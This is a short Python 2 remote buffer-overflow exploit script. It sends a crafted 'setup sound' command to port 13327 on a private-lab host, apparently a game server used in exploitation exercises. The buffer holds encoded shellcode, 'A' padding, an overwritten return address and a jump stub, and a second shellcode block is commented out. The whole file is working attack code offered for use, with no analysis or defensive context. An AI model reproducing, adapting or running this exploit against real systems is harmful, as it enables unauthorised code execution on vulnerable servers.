#!/usr/bin/python2

import socket

host='192.168.56.111'
'''
shellcode=("\xdb\xd3\xd9\x74\x24\xf4\xbd\xa3\x01\x92\xb6\x5a\x29\xc9\xb1"
"\x14\x31\x6a\x19\x03\x6a\x19\x83\xc2\x04\x41\xf4\xa3\x6d\x72"
"\x14\x90\xd2\x2f\xb1\x15\x5c\x2e\xf5\x7c\x93\x30\xad\xde\x79"
"\x58\x50\xdf\x6c\xc4\x3e\xcf\xdf\xa4\x37\x0e\xb5\x22\x10\x1c"
"\xca\x23\xe1\x9a\x78\x37\x52\xc4\xb3\xb7\xd1\xb9\x2a\x7a\x55"
"\x2a\xeb\xee\x69\x15\xc1\x6e\xdc\xdc\x21\x06\xf0\x31\xa1\xbe"
"\x66\x61\x27\x57\x19\xf4\x44\xf7\xb6\x8f\x6a\x47\x33\x5d\xec")
'''
shellcode=("\xba\x81\xb3\x8c\xde\xdb\xc3\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x14\x31\x56\x14\x83\xee\xfc\x03\x56\x10\x63\x46\xbd\x05\x94"
"\x4a\xed\xfa\x09\xe7\x10\x74\x4c\x47\x72\x4b\x0e\xf3\x25\x01"
"\x66\x06\xda\xb4\x2a\x6c\xca\xe7\x82\xf9\x0b\x6d\x44\xa2\x06"
"\xf2\x01\x13\x9d\x40\x15\x24\xfb\x6b\x95\x07\xb4\x12\x58\x07"
"\x27\x83\x08\x37\x10\xf9\x4c\x0e\xd9\xf9\x24\xbe\x36\x89\xdc"
"\xa8\x67\x0f\x75\x47\xf1\x2c\xd5\xc4\x88\x52\x65\xe1\x47\x14")




crash= shellcode + 'A'*(4368-105) + '\x97\x45\x13\x08' + '\x83\xc0\x0c\xff\xe0\x90\x90'

buffer='\x11(setup sound ' + crash +'\x90\x00#'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print  'Sending evil buffer...'
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print('Payload Sent')

